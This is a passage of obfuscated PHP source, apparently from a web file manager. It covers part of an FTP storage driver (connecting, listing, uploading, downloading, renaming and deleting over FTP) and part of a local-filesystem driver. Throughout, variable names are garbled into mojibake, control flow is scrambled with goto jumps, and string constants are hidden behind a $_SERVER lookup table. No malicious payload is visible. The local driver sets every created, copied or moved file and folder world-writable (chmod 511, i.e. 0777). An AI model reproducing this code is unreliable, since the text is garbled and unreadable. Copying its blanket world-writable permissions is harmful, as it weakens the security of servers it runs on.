array($BÍ†¡êª¹[1249] => $this->connect, $BÍ†¡êª¹[175] => $this->host, $BÍ†¡êª¹[174] => $this->scheme, $BÍ†¡êª¹[176] => $this->port); return $CèÃ¾áËïÃ; goto DãªÔ±ŸÅ; DãªÔ±ŸÅ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($c½Ÿˆ³òí, $cï™àÖ‘¬ = '', $Cñğö…íàí = REPEAT_RENAME) { if ($this->setContent($c½Ÿˆ³òí, $cï™àÖ‘¬)) { return $this->getPathOuter($c½Ÿˆ³òí); } return !1; } public function mkdir($dÖ†®íÍ‘ì, $Ağ¿ªï®›Ó = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $dÖ†®íÍ‘ì = $this->iconvSystem($dÖ†®íÍ‘ì); if ($this->_isFolder($dÖ†®íÍ‘ì) || @ftp_mkdir($this->connect, $dÖ†®íÍ‘ì)) { return $this->getPathOuter($dÖ†®íÍ‘ì); } if (!$this->mkdir($this->pathFather($dÖ†®íÍ‘ì))) { return !1; } if ($dÖ†®íÍ‘ì = @ftp_mkdir($this->connect, $dÖ†®íÍ‘ì)) { return $this->getPathOuter($dÖ†®íÍ‘ì); } return !1; } public function copyFile($AÈª„êÉ, $DÑ÷¥˜µ·) { goto AÅ—Ùß¶î; Fùë¿ãš¬œ: $this->tempFileRemve($BÅÄ²‹¢Ö); return $dĞ°Ô¿˜˜; goto Eâª›œ×Š”; FÚ¢çº„ÆË: $FŞÃ‘¯©ˆİ = $this->iconvApp($BÅÄ²‹¢Ö); $this->download($AÈª„êÉ, $FŞÃ‘¯©ˆİ); $dĞ°Ô¿˜˜ = $this->upload($DÑ÷¥˜µ·, $FŞÃ‘¯©ˆİ); goto Fùë¿ãš¬œ; AÅ—Ùß¶î: if (!$this->_isconn()) { return !1; } $f³†§£ä†ˆ = $this->pathThis($this->iconvSystem($AÈª„êÉ)); $BÅÄ²‹¢Ö = $this->tempFile($f³†§£ä†ˆ); goto FÚ¢çº„ÆË; Eâª›œ×Š”: } public function moveFile($dÊñÊ‹¹”, $DÑ‰ÃÅ“Ï) { if (!$this->_isconn()) { return !1; } $dÊñÊ‹¹” = $this->iconvSystem($dÊñÊ‹¹”); $DÑ‰ÃÅ“Ï = $this->iconvSystem($DÑ‰ÃÅ“Ï); $EÛÓÌ„±Ï = @ftp_rename($this->connect, $dÊñÊ‹¹”, $DÑ‰ÃÅ“Ï); return $EÛÓÌ„±Ï ? $this->getPathOuter($DÑ‰ÃÅ“Ï) : !1; } public function delFile($AÑ¢òÕÔµ) { if (!$this->_isconn()) { return !1; } $AÑ¢òÕÔµ = $this->iconvSystem($AÑ¢òÕÔµ); return @ftp_delete($this->connect, $AÑ¢òÕÔµ); } public function delFolder($Dùå…õ”Ø˜) { goto aô¿”ÈÄ; aô¿”ÈÄ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $AÉ¥öóÂ–¨ = $D—§Â›Ÿ­² = array(); goto A“ÓŞÇ”°; A“ÓŞÇ”°: $this->fileList($Dùå…õ”Ø˜, $AÉ¥öóÂ–¨, $D—§Â›Ÿ­², !0); $this->listItemCache = !0; foreach ($D—§Â›Ÿ­² as $fÅÓ¡£êˆù) { $D¨æâ³‰Úİ = $this->iconvSystem($fÅÓ¡£êˆù[$_SERVER[¬ı§†‰ú˜¼][28]]); $F äùİÔã¢ = @ftp_delete($this->connect, $D¨æâ³‰Úİ); if (!$F äùİÔã¢) { return !1; } } goto e†¹‰µâÂÆ; e†¹‰µâÂÆ: foreach ($AÉ¥öóÂ–¨ as $D¨æâ³‰Úİ) { $D¨æâ³‰Úİ = $this->iconvSystem($D¨æâ³‰Úİ); $F äùİÔã¢ = @ftp_rmdir($this->connect, $D¨æâ³‰Úİ); if (!$F äùİÔã¢) { return !1; } } $Dùå…õ”Ø˜ = $this->iconvSystem($Dùå…õ”Ø˜); return @ftp_rmdir($this->connect, $Dùå…õ”Ø˜); goto Fà¼˜¢»; Fà¼˜¢»: } public function rename($CÌß¯Ã‹, $cÉƒòÏÇò…) { goto DªôøÅ×¢; D“Ü„²„°Ò: $FÛ‹‹ƒ“‘ = $this->iconvSystem($FÛ‹‹ƒ“‘); $CÌß¯Ã‹ = $this->iconvSystem($CÌß¯Ã‹); $C’‚Ş•“ØØ = $this->pathFather($CÌß¯Ã‹); goto BÅùØÍÈ˜Á; DªôøÅ×¢: $Eï²®¨¨›Ô =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->_isconn()) { return !1; } $FÛ‹‹ƒ“‘ = $this->fileNameAuto($this->pathFather($CÌß¯Ã‹), $cÉƒòÏÇò…); goto D“Ü„²„°Ò; fá¤îİ©¤›: return $cØò ­Âœ ? $this->getPathOuter($bË¹•¾ï) : !1; goto e£ä¿¨”‰ƒ; BÅùØÍÈ˜Á: $bË¹•¾ï = rtrim($C’‚Ş•“ØØ, $Eï²®¨¨›Ô[8]) . $Eï²®¨¨›Ô[8] . $FÛ‹‹ƒ“‘; $cØò ­Âœ = @ftp_rename($this->connect, $CÌß¯Ã‹, $bË¹•¾ï); $bË¹•¾ï = $this->iconvApp($bË¹•¾ï); goto fá¤îİ©¤›; e£ä¿¨”‰ƒ: } private function folderInfo($a¤Ê¯Ëá˜›, $E–­ª‘Äƒé = false) { $b´½Œñ¸åø =& $_SERVER[¬ı§†‰ú˜¼]; $fìäÛîå·¸ = array($b´½Œñ¸åø[28] => $this->pathThis($a¤Ê¯Ëá˜›), $b´½Œñ¸åø[76] => $this->getPathOuter($b´½Œñ¸åø[8] . $a¤Ê¯Ëá˜›), $b´½Œñ¸åø[29] => $b´½Œñ¸åø[77]); if ($E–­ª‘Äƒé) { return $fìäÛîå·¸; } $fìäÛîå·¸[$b´½Œñ¸åø[193]] = $fìäÛîå·¸[$b´½Œñ¸åø[84]] = 0; $fìäÛîå·¸[$b´½Œñ¸åø[194]] = $fìäÛîå·¸[$b´½Œñ¸åø[195]] = !0; return $fìäÛîå·¸; } private function fileInfo($d¿Ğ‘í÷ò¬, $d®¾†ñ×½ = false, $Aœ—š¹ê²ò = array()) { goto BªÊ«õ»ÃÛ; f¼ôŠÄÎ÷: return $Eİç÷é¸«; goto bò–ø™„ğÖ; B—Ó†Á›²: $Eİç÷é¸«[$A†ø…£«·‚[193]] = $Eİç÷é¸«[$A†ø…£«·‚[84]] = 0; $Eİç÷é¸«[$A†ø…£«·‚[194]] = $Eİç÷é¸«[$A†ø…£«·‚[195]] = !0; $e™„ö¶ÏÔÁ = $this->iconvSystem($d¿Ğ‘í÷ò¬); goto EˆğŒ“Åòù; BªÊ«õ»ÃÛ: $A†ø…£«·‚ =& $_SERVER[¬ı§†‰ú˜¼]; $Eİç÷é¸« = array($A†ø…£«·‚[28] => $this->pathThis($d¿Ğ‘í÷ò¬), $A†ø…£«·‚[76] => $this->getPathOuter($A†ø…£«·‚[8] . $d¿Ğ‘í÷ò¬), $A†ø…£«·‚[29] => $A†ø…£«·‚[192], $A†ø…£«·‚[78] => isset($Aœ—š¹ê²ò[$A†ø…£«·‚[78]]) ? $Aœ—š¹ê²ò[$A†ø…£«·‚[78]] : 0, $A†ø…£«·‚[168] => $this->ext($d¿Ğ‘í÷ò¬)); if ($d®¾†ñ×½) { return $Eİç÷é¸«; } goto B—Ó†Á›²; EˆğŒ“Åòù: $Eİç÷é¸«[$A†ø…£«·‚[84]] = @ftp_mdtm($this->connect, $e™„ö¶ÏÔÁ); if (empty($Aœ—š¹ê²ò)) { $Aœ—š¹ê²ò = $this->objectMeta($d¿Ğ‘í÷ò¬); if (!$Aœ—š¹ê²ò) { return $Eİç÷é¸«; } } $Eİç÷é¸«[$A†ø…£«·‚[78]] = $Aœ—š¹ê²ò[$A†ø…£«·‚[78]]; goto f¼ôŠÄÎ÷; bò–ø™„ğÖ: } public function size($A¶‰œ â„Ï) { $eĞêİè¡‡­ = $this->objectMeta($A¶‰œ â„Ï); return $eĞêİè¡‡­ ? $eĞêİè¡‡­[$_SERVER[¬ı§†‰ú˜¼][78]] : 0; } public function info($a‡«ˆ‰…š) { if ($this->isFile($a‡«ˆ‰…š)) { return $this->fileInfo($a‡«ˆ‰…š, 0); } else { if ($this->isFolder($a‡«ˆ‰…š)) { return $this->folderInfo($a‡«ˆ‰…š); } } return !1; } private function fileList($bÜ·Ìé–­é, &$bÍÈÌ¼ğ, &$B›ß´·¿Ş, $BÌ˜ÖÑ™¡„ = false) { goto DÒ–ÙÀ›ÜŸ; AÌ„àÀ‡Áé: $CÎ¡·¶„Û = array($d¾³ì¯­°ƒ[95] => 1, $d¾³ì¯­°ƒ[1250] => 1); foreach ($FÙ¥Ë¢Ñ as $C ù—›ßë) { goto e„ÕÑ‰„¨Ê; Aßî®ä¬: if ($Cè‡ÇÇöË) { $bÍÈÌ¼ğ[] = $a†­´šùô; if ($BÌ˜ÖÑ™¡„) { $this->fileList($a†­´šùô, $bÍÈÌ¼ğ, $B›ß´·¿Ş, $BÌ˜ÖÑ™¡„); } continue; } $B›ß´·¿Ş[] = $e»½ÙÀñ´‚; goto aƒÁ¶Ö³—µ; bÆŠ‡²ö¢Ä: if (!$a†­´šùô || isset($CÎ¡·¶„Û[$a†­´šùô])) { continue; } $a†­´šùô = $this->iconvApp($bÜ·Ìé–­é . ltrim($a†­´šùô, $d¾³ì¯­°ƒ[8])); $e»½ÙÀñ´‚ = array($d¾³ì¯­°ƒ[28] => $a†­´šùô, $d¾³ì¯­°ƒ[29] => $d¾³ì¯­°ƒ[192], $d¾³ì¯­°ƒ[78] => $càåÎ¿Ìù‘[4]); goto c¨ğ‚Œ—; e„ÕÑ‰„¨Ê: $càåÎ¿Ìù‘ = $this->_listItem($C ù—›ßë); if ($càåÎ¿Ìù‘[0] == $d¾³ì¯­°ƒ[720]) { continue; } $a†­´šùô = $càåÎ¿Ìù‘[8]; goto bÆŠ‡²ö¢Ä; c¨ğ‚Œ—: if (substr($C ù—›ßë, 0, 1) == $d¾³ì¯­°ƒ[1251]) { $e»½ÙÀñ´‚[$d¾³ì¯­°ƒ[29]] = $d¾³ì¯­°ƒ[77]; $e»½ÙÀñ´‚[$d¾³ì¯­°ƒ[78]] = 0; } $Cè‡ÇÇöË = $e»½ÙÀñ´‚[$d¾³ì¯­°ƒ[29]] == $d¾³ì¯­°ƒ[77] ? !0 : !1; if ($AÈ‰¥¥¨Àé) { $this->cacheMethod($d¾³ì¯­°ƒ[198], $a†­´šùô, $Cè‡ÇÇöË); $this->cacheMethod($d¾³ì¯­°ƒ[199], $a†­´šùô, $e»½ÙÀñ´‚); } goto Aßî®ä¬; aƒÁ¶Ö³—µ: } if ($AÈ‰¥¥¨Àé) { $this->cacheMethod($d¾³ì¯­°ƒ[198], $bÜ·Ìé–­é, !0); } goto dÉƒÂ«¬Ó¾; A¤¹®ê–‡Ã: @ftp_chdir($this->connect, $d¾³ì¯­°ƒ[8]); $bÜ·Ìé–­é = rtrim($bÜ·Ìé–­é, $d¾³ì¯­°ƒ[8]) . $d¾³ì¯­°ƒ[8]; check_abort(); goto c×ÂôáŒ‘; c×ÂôáŒ‘: $AÈ‰¥¥¨Àé = $this->listItemCache === !1 ? !1 : !0; $FÙ¥Ë¢Ñ = @ftp_rawlist($this->connect, $bÜ·Ìé–­é); if (!$FÙ¥Ë¢Ñ) { $FÙ¥Ë¢Ñ = array(); } goto AÌ„àÀ‡Áé; DÒ–ÙÀ›ÜŸ: $d¾³ì¯­°ƒ =& $_SERVER[¬ı§†‰ú˜¼]; $bÜ·Ìé–­é = $this->iconvSystem($bÜ·Ìé–­é); if (!$this->isFolder($bÜ·Ìé–­é)) { return !1; } goto A¤¹®ê–‡Ã; dÉƒÂ«¬Ó¾: } private function _listItem($DŠï¤¨¶Á) { if (empty($DŠï¤¨¶Á)) { return array(); } $Fİ³ Á”Ì = preg_split($_SERVER[¬ı§†‰ú˜¼][1252], $DŠï¤¨¶Á); if (count($Fİ³ Á”Ì) <= 9) { return $Fİ³ Á”Ì; } $Fİ³ Á”Ì[8] = trim(substr($DŠï¤¨¶Á, strpos($DŠï¤¨¶Á, $Fİ³ Á”Ì[7]) + strlen($Fİ³ Á”Ì[7]))); return array_splice($Fİ³ Á”Ì, 0, 9); } public function listPath($b³ğÂêŒÒ“, $A›ãË§® = false) { goto aš¬«†Á‡µ; aš¬«†Á‡µ: $a¿èĞÑÛ…Ó =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->_isconn()) { return !1; } $d¨ç•”á = $aêÈùùÈª‘ = array(); goto FßÇ­à‡œÚ; FßÇ­à‡œÚ: $this->fileList($b³ğÂêŒÒ“, $d¨ç•”á, $aêÈùùÈª‘); foreach ($d¨ç•”á as $b®‘©Ø»¤ => $A©«¥§îÖ¿) { $d¨ç•”á[$b®‘©Ø»¤] = $this->folderInfo($A©«¥§îÖ¿, $A›ãË§®); } foreach ($aêÈùùÈª‘ as $b®‘©Ø»¤ => $A©«¥§îÖ¿) { $aêÈùùÈª‘[$b®‘©Ø»¤] = $this->fileInfo($A©«¥§îÖ¿[$a¿èĞÑÛ…Ó[28]], $A›ãË§®, $A©«¥§îÖ¿); } goto eˆµØ’˜Ì; eˆµØ’˜Ì: return array($a¿èĞÑÛ…Ó[75] => $d¨ç•”á, $a¿èĞÑÛ…Ó[74] => $aêÈùùÈª‘); goto A«„‘ò§°±; A«„‘ò§°±: } public function has($C‘–›èâ¬, $b‘¿Ü½íÃÎ = false, $cÂÓÎ”³Ñ = true) { goto FºáêëÅ³; fÎ³‹ô…œË: return !1; goto DÑ˜Û¥§ô‰; aÌÒ³¶–»ø: $this->fileList($C‘–›èâ¬, $d—’¸ß©Á, $a…ïâİ„åÓ, $E’Æ±ƒ½†); if ($b‘¿Ü½íÃÎ) { return array($F˜’í»óĞ«[202] => count($a…ïâİ„åÓ), $F˜’í»óĞ«[203] => count($d—’¸ß©Á)); } if ($cÂÓÎ”³Ñ) { if (count($a…ïâİ„åÓ)) { return !0; } } else { if (count($d—’¸ß©Á)) { return !0; } } goto fÎ³‹ô…œË; FºáêëÅ³: $F˜’í»óĞ« =& $_SERVER[¬ı§†‰ú˜¼]; $d—’¸ß©Á = $a…ïâİ„åÓ = array(); $E’Æ±ƒ½† = $b‘¿Ü½íÃÎ ? !0 : !1; goto aÌÒ³¶–»ø; DÑ˜Û¥§ô‰: } public function listAll($C„¸†ÙÄÒ¹) { goto DñÈ¿É¶õŠ; cË³¿å·¿: $this->fileList($C„¸†ÙÄÒ¹, $aÊ£›ÄÎã, $AÈš·‡Á˜•, !0); $cêÎˆïÆÎˆ = array(); foreach ($AÈš·‡Á˜• as $cğ¦âÖÏ™æ) { $cêÎˆïÆÎˆ[$cğ¦âÖÏ™æ[$aºóÅ¬Š£Ö[28]]] = $cğ¦âÖÏ™æ[$aºóÅ¬Š£Ö[78]]; } goto D•ÚàºÁô×; DñÈ¿É¶õŠ: $aºóÅ¬Š£Ö =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->_isconn()) { return !1; } $aÊ£›ÄÎã = $AÈš·‡Á˜• = array(); goto cË³¿å·¿; D•ÚàºÁô×: foreach ($aÊ£›ÄÎã as $cğ¦âÖÏ™æ) { if (is_string($cğ¦âÖÏ™æ)) { $cêÎˆïÆÎˆ[$cğ¦âÖÏ™æ] = 0; } } return $this->listAllFiles($C„¸†ÙÄÒ¹, array_keys($cêÎˆïÆÎˆ), $cêÎˆïÆÎˆ); goto AÇ¢†¿»ë; AÇ¢†¿»ë: } public function getContent($C ğİ ¸) { if (!$this->_isconn()) { return !1; } $C ğİ ¸ = $this->iconvSystem($C ğİ ¸); return $this->fileSubstr($C ğİ ¸); } public function setContent($DÀ¶£©‹‚‰, $c£‡ß°ó”É = '') { goto bëÈ¤šÑê¥; Dõ¾¯©»¬‘: return $A—‰‰­è—; goto Dë·õ÷‹¢„; fª˜šÊÏåˆ: file_put_contents($cÙ¨§¡ß¢Î, $c£‡ß°ó”É); $A—‰‰­è— = $this->upload($DÀ¶£©‹‚‰, $this->iconvApp($cÙ¨§¡ß¢Î)); $this->tempFileRemve($cÙ¨§¡ß¢Î); goto Dõ¾¯©»¬‘; bëÈ¤šÑê¥: if (!$this->_isconn()) { return !1; } $fù¼£¬Ñ¢æ = $this->pathThis($this->iconvSystem($DÀ¶£©‹‚‰)); $cÙ¨§¡ß¢Î = $this->tempFile($fù¼£¬Ñ¢æ); goto fª˜šÊÏåˆ; Dë·õ÷‹¢„: } public function fileSubstr($eóŠš¨óŸ, $AÒÀÈß¡½ = 0, $FÁ‰ÑÑ¬“÷ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($eóŠš¨óŸ, $AÒÀÈß¡½, $FÁ‰ÑÑ¬“÷); } private function ftpRequest($Cš«Í‰—• , $f¬“°ÜÁç = 0, $e¢’Îˆç¯² = false) { goto Då‡‡šƒÁ›; Då‡‡šƒÁ›: $Cš«Í‰—•  = $this->iconvSystem($Cš«Í‰—• ); $fé„ÙİàÍø = $this->scheme . $this->host . $_SERVER[¬ı§†‰ú˜¼][4] . $this->port; $bÕ¹ÖéÅØñ = curl_init(); goto cÎˆë†Ä³; fö¨íô›Í: return $cƒ±êâ–Ğ»; goto C†äöİï§; DªÆŞ“‚ô’: curl_setopt($bÕ¹ÖéÅØñ, CURLOPT_RETURNTRANSFER, 1); $cƒ±êâ–Ğ» = curl_exec($bÕ¹ÖéÅØñ); curl_close($bÕ¹ÖéÅØñ); goto fö¨íô›Í; cÎˆë†Ä³: curl_setopt($bÕ¹ÖéÅØñ, CURLOPT_URL, $fé„ÙİàÍø . $this->pathEncode($Cš«Í‰—• )); curl_setopt($bÕ¹ÖéÅØñ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($e¢’Îˆç¯²) { $döô¹µÇ†© = $f¬“°ÜÁç + $e¢’Îˆç¯² - 1; curl_setopt($bÕ¹ÖéÅØñ, CURLOPT_RANGE, "{$f¬“°ÜÁç}\55{$döô¹µÇ†©}"); } goto DªÆŞ“‚ô’; C†äöİï§: } public function upload($AïÇŒÉŸ‘Ğ, $e¬ŠÆƒ¦İ, $A”‹…‚òŸ‡ = false, $E²§ÚÛëê = REPEAT_REPLACE) { goto DÉŒ¦ˆ ó†; DÉŒ¦ˆ ó†: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($AïÇŒÉŸ‘Ğ))) { return !1; } $AïÇŒÉŸ‘Ğ = $this->iconvSystem($AïÇŒÉŸ‘Ğ); goto fŸÖåƒ¯ŠÁ; fŸÖåƒ¯ŠÁ: $e¬ŠÆƒ¦İ = $this->iconvSystem($e¬ŠÆƒ¦İ); $Cé òÛÏ¨ = ftp_nb_put($this->connect, $AïÇŒÉŸ‘Ğ, $e¬ŠÆƒ¦İ, FTP_BINARY); while ($Cé òÛÏ¨ == FTP_MOREDATA) { $Cé òÛÏ¨ = ftp_nb_continue($this->connect); } goto bÃé³Œ×‡; bÃé³Œ×‡: if ($Cé òÛÏ¨ != FTP_FINISHED) { return !1; } return $this->getPathOuter($AïÇŒÉŸ‘Ğ); goto d™ÇÜ™Šè; d™ÇÜ™Šè: } public function download($d‹²Œ§“Ø, $A“‰÷²…œœ = '') { goto AÄ¯÷ÎëÇç; Aóî¨‡¼İ: $d‹²Œ§“Ø = $this->iconvSystem($d‹²Œ§“Ø); $A“‰÷²…œœ = $this->iconvSystem($A“‰÷²…œœ); $CÎ¬ÚïŒõ = ftp_nb_get($this->connect, $A“‰÷²…œœ, $d‹²Œ§“Ø, FTP_BINARY); goto AÏ­É¸¥©—; AÏ­É¸¥©—: while ($CÎ¬ÚïŒõ == FTP_MOREDATA) { $CÎ¬ÚïŒõ = ftp_nb_continue($this->connect); } if ($CÎ¬ÚïŒõ != FTP_FINISHED) { return !1; } return $this->iconvApp($A“‰÷²…œœ); goto Dë‚ªğÜ‚î; AÄ¯÷ÎëÇç: if (!$this->_isconn()) { return !1; } $f²‡ç¢ÅÂ· = $this->pathFather($A“‰÷²…œœ); if (!IO::mkdir($f²‡ç¢ÅÂ·)) { return !1; } goto Aóî¨‡¼İ; Dë‚ªğÜ‚î: } public function exist($fÕâ÷¶ìä) { return $this->isFile($fÕâ÷¶ìä) || $this->isFolder($fÕâ÷¶ìä); } public function isFile($bÏ…¾«Â) { return !$this->isFolder($bÏ…¾«Â) && $this->objectMeta($bÏ…¾«Â); } public function isFolder($A¤‰ÅŒçŒš) { return $this->cacheMethod($_SERVER[¬ı§†‰ú˜¼][198], $A¤‰ÅŒçŒš); } protected function objectMeta($B¸ˆÇîÍ­™) { return $this->cacheMethod($_SERVER[¬ı§†‰ú˜¼][199], $B¸ˆÇîÍ­™); } protected function _objectMeta($fš—Ò¿Ù£) { goto a÷¹ò¨“ç¡; bù¸ôë­˜µ: $b•ŒÑ’óÂ‚ = @ftp_size($this->connect, $fš—Ò¿Ù£); if ($b•ŒÑ’óÂ‚ != -1) { $AÍàæ«îå[$fªÖ‘’‘’É[78]] = $b•ŒÑ’óÂ‚; } else { $CÑÉ»Ğ˜Œ = @ftp_chdir($this->connect, $fš—Ò¿Ù£); if (!$CÑÉ»Ğ˜Œ) { return !1; } $AÍàæ«îå[$fªÖ‘’‘’É[29]] = $fªÖ‘’‘’É[77]; } return $AÍàæ«îå; goto BÇ®ÁÎæè‘; a÷¹ò¨“ç¡: $fªÖ‘’‘’É =& $_SERVER[¬ı§†‰ú˜¼]; if ($fš—Ò¿Ù£ == $fªÖ‘’‘’É[33] || $fš—Ò¿Ù£ == $fªÖ‘’‘’É[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto dÉšø³¯ËŒ; dÉšø³¯ËŒ: $fš—Ò¿Ù£ = $this->iconvSystem($fš—Ò¿Ù£); $AÍàæ«îå = array($fªÖ‘’‘’É[28] => $this->iconvApp($fš—Ò¿Ù£), $fªÖ‘’‘’É[29] => $fªÖ‘’‘’É[192], $fªÖ‘’‘’É[78] => 0); @ftp_chdir($this->connect, $fªÖ‘’‘’É[8]); goto bù¸ôë­˜µ; BÇ®ÁÎæè‘: } protected function _isFolder($CÄ­¸×) { $d…È§áêÓ =& $_SERVER[¬ı§†‰ú˜¼]; if ($CÄ­¸× == $d…È§áêÓ[33] || $CÄ­¸× == $d…È§áêÓ[8]) { return !0; } $Cµ´”¥Ú = $this->_objectMeta($CÄ­¸×); return isset($Cµ´”¥Ú[$d…È§áêÓ[29]]) && $Cµ´”¥Ú[$d…È§áêÓ[29]] == $d…È§áêÓ[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($A›ãÔ°¢½) { if (substr($A›ãÔ°¢½, 0, 2) == $_SERVER[¬ı§†‰ú˜¼][1243]) { $A›ãÔ°¢½ = BASIC_PATH . substr($A›ãÔ°¢½, 2); } return $A›ãÔ°¢½; } public function iconvApp($e­¢¿‡ÂÄª) { $C«îâÖßö‘ =& $_SERVER[¬ı§†‰ú˜¼]; global $config; return $this->iconvTo($e­¢¿‡ÂÄª, $config[$C«îâÖßö‘[1241]], $config[$C«îâÖßö‘[1240]]); } public function iconvSystem($F‡±¬‡§·À) { $e®ˆŸ¦¹÷Ë =& $_SERVER[¬ı§†‰ú˜¼]; global $config; return $this->iconvTo($F‡±¬‡§·À, $config[$e®ˆŸ¦¹÷Ë[1240]], $config[$e®ˆŸ¦¹÷Ë[1241]]); } public function getPathOuter($d‹¢ÔŒ§É…) { goto AÀå´¯°ìª; Dâ¶ª…åòì: if (substr($A×–®ò©, 0, 2) == $FåÈÍªŸç[1243]) { $A×–®ò© = BASIC_PATH . substr($A×–®ò©, 2); } if (substr($d‹¢ÔŒ§É…, 0, 2) == $FåÈÍªŸç[1243]) { $d‹¢ÔŒ§É… = BASIC_PATH . substr($d‹¢ÔŒ§É…, 2); } $A×–®ò© = KodIO::clear($A×–®ò©); goto DÌ‚ê·£Ø; AÀå´¯°ìª: $FåÈÍªŸç =& $_SERVER[¬ı§†‰ú˜¼]; $A×–®ò© = $this->iconvApp($this->pathBase); $d‹¢ÔŒ§É… = $this->iconvApp($d‹¢ÔŒ§É…); goto Dâ¶ª…åòì; b¶ÁÑğêÔŠ: return $this->pathDriver . $FåÈÍªŸç[8] . ltrim($d‹¢ÔŒ§É…, $FåÈÍªŸç[8]); goto f£ß·Şõİğ; DÌ‚ê·£Ø: $d‹¢ÔŒ§É… = KodIO::clear($d‹¢ÔŒ§É…); $d‹¢ÔŒ§É… = substr($d‹¢ÔŒ§É…, strlen($A×–®ò©)); if (empty($this->pathDriver)) { return $d‹¢ÔŒ§É…; } goto b¶ÁÑğêÔŠ; f£ß·Şõİğ: } public function mkfile($DÏõëâ¿Æ, $f·¶˜Õ¥˜Š = '', $cøË­ÎŒ” = REPEAT_RENAME) { $DÏõëâ¿Æ = $this->iconvSystem($DÏõëâ¿Æ); @touch($DÏõëâ¿Æ); if ($f·¶˜Õ¥˜Š) { file_put_contents($DÏõëâ¿Æ, $f·¶˜Õ¥˜Š); } @chmod($DÏõëâ¿Æ, 511); return is_file($DÏõëâ¿Æ) ? $this->getPathOuter($DÏõëâ¿Æ) : !1; } public function mkdir($Cøíæ×ÔŠÃ, $bù£ßÒß¡ = REPEAT_SKIP) { $Cøíæ×ÔŠÃ = $this->iconvSystem($Cøíæ×ÔŠÃ); if (is_dir($Cøíæ×ÔŠÃ)) { return $this->getPathOuter($Cøíæ×ÔŠÃ); } @mkdir($Cøíæ×ÔŠÃ, 511, !0); @chmod($Cøíæ×ÔŠÃ, 511); return is_dir($Cøíæ×ÔŠÃ) ? $this->getPathOuter($Cøíæ×ÔŠÃ) : !1; } public function copyFile($DÂÆÂ§ÛË³, $B‹£¥²°¥ï) { $this->mkdir($this->pathFather($B‹£¥²°¥ï)); $DÂÆÂ§ÛË³ = $this->iconvSystem($DÂÆÂ§ÛË³); $B‹£¥²°¥ï = $this->iconvSystem($B‹£¥²°¥ï); $eœ½¯§Ñ‡ = copy_64($DÂÆÂ§ÛË³, $B‹£¥²°¥ï); @chmod($B‹£¥²°¥ï, 511); return $eœ½¯§Ñ‡ ? $this->getPathOuter($B‹£¥²°¥ï) : !1; } public function moveFile($AŒ«Öµê¯, $bŠÊñ­Íìœ) { goto eª¨”œŠ¼–; AƒÅ¾øô“ê: $e”áŸ¶æ¾ä = intval(@rename($AŒ«Öµê¯, $bŠÊñ­Íìœ)); if (!$e”áŸ¶æ¾ä) { if ($e”áŸ¶æ¾ä = intval(@copy_64($AŒ«Öµê¯, $bŠÊñ­Íìœ))) { @unlink($AŒ«Öµê¯); } } @chmod($bŠÊñ­Íìœ, 511); goto B®„²¾¿¼; B®„²¾¿¼: return $e”áŸ¶æ¾ä ? $this->getPathOuter($bŠÊñ­Íìœ) : !1; goto Aİ’ùšéÆ; eª¨”œŠ¼–: $this->mkdir($this->pathFather($bŠÊñ­Íìœ)); $AŒ«Öµê¯ = $this->iconvSystem($AŒ«Öµê¯); $bŠÊñ­Íìœ = $this->iconvSystem($bŠÊñ­Íìœ); goto AƒÅ¾øô“ê; Aİ’ùšéÆ: } public function delFile($EñİãŠ±òµ) { $EñİãŠ±òµ = $this->iconvSystem($EñİãŠ±òµ); if (!@unlink($EñİãŠ±òµ)) { @chmod($EñİãŠ±òµ, 511); if (!@unlink($EñİãŠ±òµ)) { return !1; } } else { return !0; } } public function delFolder($f¤Ÿ×Î½Ö) { goto Eõ‰“ùâ”Ë; eáÂëÄ¤Ò£: return rmdir($f¤Ÿ×Î½Ö); goto D±££š÷ª; añ–„ÛŠ¸Ş: if (!($A—Âù‹Ô® = opendir($f¤Ÿ×Î½Ö))) { return !1; } while (($BµÑéÓ‡§ò = readdir($A—Âù‹Ô®)) !== !1) { if ($BµÑéÓ‡§ò == $A¨Ïñ¯¼´š[95] || $BµÑéÓ‡§ò == $A¨Ïñ¯¼´š[1250]) { continue; } $Dë Ûİİß¶ = $f¤Ÿ×Î½Ö . $A¨Ïñ¯¼´š[8] . $BµÑéÓ‡§ò; if (is_file($Dë Ûİİß¶) || is_link($Dë Ûİİß¶)) { if (!unlink($Dë Ûİİß¶)) { chmod($Dë Ûİİß¶, 511); if (!unlink($Dë Ûİİß¶)) { return !1; } } } else { if (is_dir($Dë Ûİİß¶)) { chmod($Dë Ûİİß¶, 511); $Dë Ûİİß¶ = $this->iconvApp($Dë Ûİİß¶); if (!$this->delFolder($Dë Ûİİß¶)) { return !1; } } } } closedir($A—Âù‹Ô®); goto eáÂëÄ¤Ò£; Eõ‰“ùâ”Ë: $A¨Ïñ¯¼´š =& $_SERVER[¬ı§†‰ú˜¼]; $f¤Ÿ×Î½Ö = $this->iconvSystem($f¤Ÿ×Î½Ö); if (!is_dir($f¤Ÿ×Î½Ö)) { return !0; } goto añ–„ÛŠ¸Ş; D±££š÷ª: } public function rename($Eä™ù·œÜŒ, $añ¼£ØæŞ) { goto fŒ³‘ŠÍ™Ë; A»ˆÄÍ©Óæ: $D†È§±šÄ = @rename($Eä™ù·œÜŒ, $C»¡¾øÂÁ‡); $C»¡¾øÂÁ‡ = $this->iconvApp($C»¡¾øÂÁ‡); return $D†È§±šÄ ? $this->getPathOuter($C»¡¾øÂÁ‡) : !1; goto d‚ƒ¡Š„ƒÜ; fŒ³‘ŠÍ™Ë: $c«ÕÃ¥ì×‹ =& $_SERVER[¬ı§†‰ú˜¼]; $fâÌ©¼‚…ù = $this->fileNameAuto($this->pathFather($Eä™ù·œÜŒ), $añ¼£ØæŞ); $fâÌ©¼‚…ù = $this->iconvSystem($fâÌ©¼‚…ù); goto c…Şõ¨÷Ê; c…Şõ¨÷Ê: $Eä™ù·œÜŒ = $this->iconvSystem($Eä™ù·œÜŒ); $d±İ“ƒ†ºË = $this->pathFather($Eä™ù·œÜŒ); 